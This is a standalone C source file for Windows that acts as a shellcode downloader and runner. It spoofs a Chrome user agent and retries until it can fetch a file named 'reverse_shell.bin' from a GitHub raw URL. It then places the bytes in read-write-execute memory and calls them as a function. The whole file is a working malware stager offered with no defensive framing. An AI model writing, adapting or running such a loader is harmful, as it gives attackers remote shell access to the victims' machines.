#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "winhttp.lib")


int _tmain(void*) {

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	BYTE* shellcode = NULL;
	SIZE_T totalSize = 0;

	while (!bResults)
	{
		// Initialize WinHTTP to obtain a session handle
		hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
			WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS, 0);

		// Specify the target HTTPS server
		if (hSession)
			hConnect = WinHttpConnect(hSession, L"raw.githubusercontent.com", 
				INTERNET_DEFAULT_PORT, 0);

		// Create an HTTP request handle.
		if (hConnect)
			hRequest = WinHttpOpenRequest(hConnect, L"GET",
				L"/WalterDrake/VCS-Programming/refs/heads/master/reverse_shell.bin",
				NULL, WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				WINHTTP_FLAG_SECURE);

		// Send the request
		if (hRequest)
			bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS, 0,
				WINHTTP_NO_REQUEST_DATA, 0,
				0, 0);
		if (!bResults) {
			_tprintf(L"Error %u in WinHttpSendRequest.\n", GetLastError());
		}
		else
			break;
		Sleep(10000);
	}

	// Receive the response
	bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do {
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				_tprintf(L"Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
				break;
			}

			// Allocate space for the buffer.
			pszOutBuffer = (LPSTR)malloc(dwSize + 1);
			if (!pszOutBuffer)
			{
				_tprintf(L"Out of memory\n");
				break;
			}

			ZeroMemory(pszOutBuffer, dwSize + 1);
			// Read the data.
			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
			{
				_tprintf(L"Error %u in WinHttpReadData.\n", GetLastError());
				free(pszOutBuffer);
				break;
			}
			if (dwDownloaded > 0)
			{
				// Write chunk to buffer
				BYTE *chunk = (BYTE*)realloc(shellcode, totalSize + dwDownloaded);
				if (!chunk) {
					free(shellcode);
					free(pszOutBuffer);
					_tprintf(L"Memory allocation failed\n");
					exit(1);
				}
				shellcode = chunk;
				memcpy(shellcode + totalSize, pszOutBuffer, dwDownloaded);
				totalSize += dwDownloaded;
			}
			free(pszOutBuffer);
		} while (dwSize > 0);
	}

	if (shellcode && totalSize > 0)
	{
		// Allocate executable memory
		void* execMem = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (execMem == NULL) {
			_tprintf(L"VirtualAlloc failed with error %u\n", GetLastError());
			free(shellcode);
			exit(1);
		}
		memcpy(execMem, shellcode, totalSize);
		free(shellcode);
		// Define function pointer to that memory
		void (*func)() = (void(*)())execMem;
		__try {
			func();
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			_tprintf(L"Payload caused an exception!\n");
		}
	}
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return 0;
}
